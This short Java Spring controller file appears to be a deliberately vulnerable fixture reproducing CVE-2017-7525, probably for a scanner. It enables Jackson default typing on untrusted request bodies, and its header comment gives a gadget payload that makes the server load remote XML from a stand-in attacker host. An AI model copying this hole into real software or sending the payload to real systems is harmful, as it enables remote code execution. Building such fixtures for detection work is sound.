package com.deptex;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

/**
 * CVE-2017-7525 — polymorphic-deserialization RCE in jackson-databind.
 *
 * The @RequestBody-bound `body` flows into ObjectMapper.readValue, and the
 * mapper was constructed with `enableDefaultTyping()` enabled — so a JSON
 * payload like
 *
 *   ["org.springframework.context.support.ClassPathXmlApplicationContext",
 *    "http://attacker.example/x.xml"]
 *
 * causes Jackson to instantiate the discriminator class and trigger
 * remote class loading.
 */
@RestController
public class IngestController {

    private final ObjectMapper mapper;

    public IngestController() {
        this.mapper = new ObjectMapper();
        // Dangerous: polymorphic-deser gadget surface is now open.
        this.mapper.enableDefaultTyping();
    }

    @PostMapping("/ingest")
    public String ingest(@RequestBody String body) throws Exception {
        // Sink: ObjectMapper.readValue with attacker JSON + defaultTyping.
        Object parsed = mapper.readValue(body, Object.class);
        return "parsed: " + parsed;
    }
}
